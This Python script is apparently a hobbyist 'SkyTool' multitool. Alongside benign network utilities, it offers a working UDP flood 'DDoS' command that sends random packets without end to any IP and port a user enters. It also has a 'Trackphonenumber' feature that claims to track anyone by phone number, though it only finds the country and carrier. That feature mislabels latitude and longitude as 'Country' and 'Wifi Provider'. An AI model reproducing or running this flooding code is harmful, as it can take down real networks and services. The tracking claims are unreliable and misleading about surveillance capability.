#Create By Sky Inc.
#Program By Sky Inc Team
#https://discord.gg/Sk8uYaqnhz
#Create By SkypeG

import requests
import json
import os
import sys
import socket
import random
import random
import colorama
import socket, random, time
import phonenumbers
import pycountry
import folium
import os
import pyfiglet
import string
import secrets
import subprocess
import whois

from colorama import Fore, Back, Style
from tqdm import tqdm
from pathlib import Path
from phonenumbers import geocoder
from phonenumbers import carrier
from phonenumbers.phonenumberutil import region_code_for_country_code
from phonenumbers.phonenumberutil import region_code_for_number
from opencage.geocoder import OpenCageGeocode

"""
    http://ip-api.com/json/IP_ADDRES
    http://www.google.com/maps/@LAT,LON,9z?hl=id
"""

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

ascii_banner = pyfiglet.figlet_format("Skytool >")
print(ascii_banner)

for _ in tqdm(range(100),
    desc = "Loading...",
    ascii = False,ncols=75):
    time.sleep(0.05)

clear_terminal()

print ("###############################################################################")
print ("                                                                               ")
print ("    				create by SkypeG                                           ")
print ("    								                                           ")
print ("   				   SkyTool                                                     ")
print ("                                   V1.2                                        ")
print ("                                                                               ")
print ("  https://github.com/SkypeG                                                    ")
print ("  https://www.youtube.com/@Skype112G/featured			                       ")
print ("###############################################################################")
print ("Use 'Help' To See The Command!")

host = socket.gethostname()

selection = input(host + "@Skytool :")

if selection=="help":
    print("""
    CUSTOMASCII : Print Your Ascii Art Text
    MYQUERYIP : For Checking Your Query IP
    MYIP : For Checking Your Computer IP
    IP : Fo Check Data From An Ip Address
    IPCONFIG : Used To Display Information About The Network Configuration On The Computer
    WHOAMI : This command is used to display information about the current user currently logged into the Windows operating system
    PWGEN : For Generate Secure Password
    DDoS : DDoS Tool
    Wifi : Check You Wifi Pass
    Trackphonenumber : For Track Everyone With Phone Number
    WHOIS : To find information about a domain name such as registration information, contact information, and technical information about the given domain name
    PING
    TRACERT : Used to find out the path or route taken by data packets

    Note : Write commands in all lowercase
   """)

if selection=="customascii":
    ascii_banner_custom = pyfiglet.figlet_format(input("Ascii :"))
    print(ascii_banner_custom)

if selection=="credits":
    print("""
    Create By Sky Inc.
    Programmed By Sky Inc.
    """)

if selection=="myip":
    host = socket.gethostname()
    print("Device Name :", host)

    ip = socket.gethostbyname(host)
    print("Ip :",ip)

if selection=="pwgen":
    alphabet = string.ascii_letters + string.digits
    password = ''.join(secrets.choice(alphabet) for i in range(16))

    print("The Password Is :" + password)

if selection=="DDoS":
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ip = input("Enter Target IP: ")
    port = int(input("Enter Target Port: "))
    sleep = float(input("Sleep: "))
 
    s.connect((ip, port))
 
    for i in range(1, 100**1000):
        s.send(random._urandom(10)*1000)
        print(f"Send: {i}", end='\r')
        time.sleep(sleep)

if selection=="ip":
    import IPGEO

if os.path.exists("mylocation.html"):
  os.remove("mylocation.html")

if selection=="trackphonenumber":
  number = input("Enter Phone Number: ")
  pn = phonenumbers.parse(number)

  country = pycountry.countries.get(alpha_2=region_code_for_number(pn))
  location = country.name
  print(location)

  print(carrier.name_for_number(phonenumbers.parse(number), "en"))

  key = input("Enter Your API KEY: ")
  geocoder = OpenCageGeocode(key)
  query = str(location)
  results = geocoder.geocode(query)
  lat = results[0]['geometry']['lat']
  lng = results[0]['geometry']['lng']
  print("Country", lat)
  print("Wifi Provider", lng)

  myMap = folium.Map(location=[lat , lng], zoom_start=9)
  folium.Marker([lat,lng],popup=location).add_to(myMap)
  myMap.save("mylocation.html")
  os.system("mylocation.html")

if selection=="wifi":
    import wifi

if selection=="myqueryip":
    import query

if selection=="ipconfig":
    ipconfig = subprocess.run('ipconfig', capture_output=True, text=True)
    print(ipconfig.stdout)

if selection=="whoami":
    whoami = subprocess.run('whoami', capture_output=True, text=True)
    whoamiusername = whoami.stdout.strip()

    print(f"Username: {whoamiusername}")

if selection=="whois":
    domain_name = input("Input The Link/Domain Web :")
    whois_info = whois.whois(domain_name)

    print(f"Domain name: {whois_info.domain_name}")
    print(f"Registrar: {whois_info.registrar}")
    print(f"Registration date: {whois_info.creation_date}")
    print(f"Expiration date: {whois_info.expiration_date}")
    print(f"Last updated: {whois_info.updated_date}")
    print(f"Name servers: {whois_info.name_servers}")
    print(f"Registrant: {whois_info.registrant}")

if selection=="ping":
    ping_hostname = input("Input Web URL :")
    ping_result = subprocess.run(['ping', '-c', '4', ping_hostname], capture_output=True)

    ping_output = ping_result.stdout.decode('utf-8')

    print(ping_output)

if selection=="tracert":
    tracert_hostname = input("Input The Web URL :")
    tracert_result = subprocess.run(['tracert', '-d', tracert_hostname], capture_output=True)

    tracert_output = tracert_result.stdout.decode('utf-8')

    print(tracert_output)

else:
    print("[System] Sorry Command Not Found!")
